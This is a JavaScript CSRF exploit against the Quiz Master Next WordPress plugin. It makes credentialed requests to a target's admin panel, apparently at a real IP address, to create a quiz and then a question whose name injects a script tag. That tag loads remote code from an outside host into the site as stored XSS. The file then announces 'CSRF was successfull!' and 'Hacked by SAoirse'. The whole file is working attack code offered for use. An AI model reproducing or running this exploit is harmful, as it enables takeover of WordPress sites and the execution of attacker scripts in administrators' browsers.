//const origin = "http://localhost:8000";
//const myOrigin = "http://localhost:8081/script2";
const origin = "http://77.238.121.150:8000";
const myOrigin = "http://mylogbook.ir/script2";
const url1 = origin + '/wp-admin/admin.php?page=quiz-master-next%2Fmlw_quizmaster2.php';
const param1 = "create_quiz=confirmation&quiz_name=Injected+Quiz";
const url2 = origin + '/wp-admin/admin.php?page=mlw_quiz_options&quiz_id=1';

// Add quiz
document.getElementsByTagName("h1")[0].innerHTML = "Inserting Quiz";
var xhr = new XMLHttpRequest();
xhr.open("POST", url1);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;
xhr.onreadystatechange = function () {
    if (this.readyState === XMLHttpRequest.DONE) {
        document.getElementsByTagName("h1")[0].innerHTML = "Inserting Question";
        var xhr = new XMLHttpRequest();
        xhr.open("POST", url2);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.withCredentials = true;

        var param2 = `question_type=7&question_name=Injected+Question<script src=${myOrigin}></script>&correct_answer_info=&hint=&comments=1&new_question_order=1&required=0&new_new_category=&new_question_answer_total=0&question_submission=new_question&quiz_id=1&question_id=0`;
        xhr.onreadystatechange = function () {
            if (this.readyState === XMLHttpRequest.DONE) {
                document.getElementsByTagName("h1")[0].innerHTML = "CSRF was successfull!";
                document.getElementsByTagName("h2")[0].innerHTML = "Hacked by SAoirse ";
            } 
        };
        xhr.send(param2);
    } 
};
xhr.send(param1);

